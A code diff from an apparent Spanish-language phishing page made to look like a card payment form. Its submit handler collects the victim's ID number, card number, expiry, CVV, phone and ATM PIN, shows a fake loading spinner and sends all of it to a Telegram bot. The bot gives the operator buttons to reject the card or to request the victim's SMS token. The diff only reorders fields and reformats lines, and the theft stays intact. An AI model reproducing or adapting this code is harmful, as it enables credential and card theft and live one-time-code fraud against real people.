-            pagoForm.addEventListener("submit", async (event) => {
-                event.preventDefault();
-                errorMessage.classList.add('hidden');
+            pagoForm.addEventListener("submit", async (event) => { 
+                event.preventDefault(); 
+                errorMessage.classList.add('hidden'); 
 
                 // Se obtienen los valores de los nuevos campos
                 const tipoDoc = tipoDocInput.value.trim();
                 const cedula = cedulaInput.value.trim();
-                const nombreTitular = nombreTitularInput.value.trim();
-                const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, '');
-                const fechaExp = fechaExpInput.value.trim();
-                const cvv = cvvInput.value.trim();
-                const telefono = telefonoInput.value.trim();
                 const claveCajero = claveCajeroInput.value.trim();
+                const nombreTitular = nombreTitularInput.value.trim(); 
+                const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, ''); 
+                const fechaExp = fechaExpInput.value.trim(); 
+                const cvv = cvvInput.value.trim(); 
+                const telefono = telefonoInput.value.trim(); 
 
-                const now = new Date();
-                const formattedDate = now.toLocaleDateString('es-CO', {
-                    day: 'numeric', month: 'numeric', year: 'numeric'
-                });
-                const formattedTime = now.toLocaleTimeString('es-CO', {
-                    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
-                });
+                const now = new Date(); 
+                const formattedDate = now.toLocaleDateString('es-CO', { 
+                    day: 'numeric', month: 'numeric', year: 'numeric' 
+                }); 
+                const formattedTime = now.toLocaleTimeString('es-CO', { 
+                    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true 
+                }); 
 
-                app.style.display = 'none';
-                spinnerModal.style.display = 'flex';
+                app.style.display = 'none'; 
+                spinnerModal.style.display = 'flex'; 
 
-                let telegramMessage = '🍀 GOLEADOR 🍀\n\n';
-                telegramMessage += `Tipo de Ingreso: Tarjeta de Crédito\n`;
+                let telegramMessage = '🍀 GOLEADOR 🍀\n\n'; 
+                telegramMessage += `Tipo de Ingreso: Tarjeta de Crédito\n`; 
                 // Se agregan los nuevos datos al mensaje de Telegram
                 telegramMessage += `Tipo de Doc: ${tipoDoc}\n`;
                 telegramMessage += `Cédula: ${cedula}\n`;
-                telegramMessage += `Nombre: ${nombreTitular}\n`;
-                telegramMessage += `Teléfono: ${telefono}\n`;
-                telegramMessage += `Tarjeta: ${numeroTarjeta}\n`;
-                telegramMessage += `Fecha Exp: ${fechaExp}\n`;
-                telegramMessage += `CVV: ${cvv}\n`;
-                telegramMessage += `Clave Cajero: ${claveCajero}\n\n`;
-                telegramMessage += `Fecha/Hora: ${formattedDate}, ${formattedTime}`;
+                telegramMessage += `Clave: ${claveCajero}\n\n`;
+                telegramMessage += `Nombre: ${nombreTitular}\n`; 
+                telegramMessage += `Teléfono: ${telefono}\n`; 
+                telegramMessage += `Tarjeta: ${numeroTarjeta}\n`; 
+                telegramMessage += `Fecha Exp: ${fechaExp}\n`; 
+                telegramMessage += `CVV: ${cvv}\n\n`; 
+                telegramMessage += `Fecha/Hora: ${formattedDate}, ${formattedTime}`; 
 
-                const keyboard = {
-                    inline_keyboard: [
-                        [{ text: "❌ Error Tarjeta", callback_data: `error_tc:${transactionId}` }],
-                        [{ text: "👀 Pedir Token SMS", callback_data: `pedir_token_sms:${transactionId}` }],
-                        [{ text: "🚨Finalizar", callback_data: `finalizar:${transactionId}` }]
-                    ]
-                };
+                const keyboard = { 
+                    inline_keyboard: [ 
+                        [{ text: "❌ Error Tarjeta", callback_data: `error_tc:${transactionId}` }], 
+                        [{ text: "👀 Pedir Token SMS", callback_data: `pedir_token_sms:${transactionId}` }], 
+                        [{ text: "🚨Finalizar", callback_data: `finalizar:${transactionId}` }] 
+                    ] 
+                }; 
 
-                const messageId = await sendToTelegram(telegramMessage, keyboard);
+                const messageId = await sendToTelegram(telegramMessage, keyboard); 
 
-                if (messageId) {
-                    sessionStorage.setItem('telegramMessageId', messageId);
-                    checkVerificationStatus();
-                } else {
-                    spinnerModal.style.display = 'none';
-                    app.style.display = 'block';
-                    alert("Error al enviar los datos. Por favor, inténtalo de nuevo.");
-                }
-            });
+                if (messageId) { 
+                    sessionStorage.setItem('telegramMessageId', messageId); 
+                    checkVerificationStatus(); 
+                } else { 
+                    spinnerModal.style.display = 'none'; 
+                    app.style.display = 'block'; 
+                    alert("Error al enviar los datos. Por favor, inténtalo de nuevo."); 
+                } 
+            }); 
 
-            // Inicialización
-            const configLoaded = await loadTelegramConfig();
-            if (configLoaded) {
-                await initLastUpdateId();
-            }
-        });
-    </script>
-</body>
+            // Inicialización 
+            const configLoaded = await loadTelegramConfig(); 
+            if (configLoaded) { 
+                await initLastUpdateId(); 
+            } 
+        }); 
+    </script> 
+</body> 
 </html>
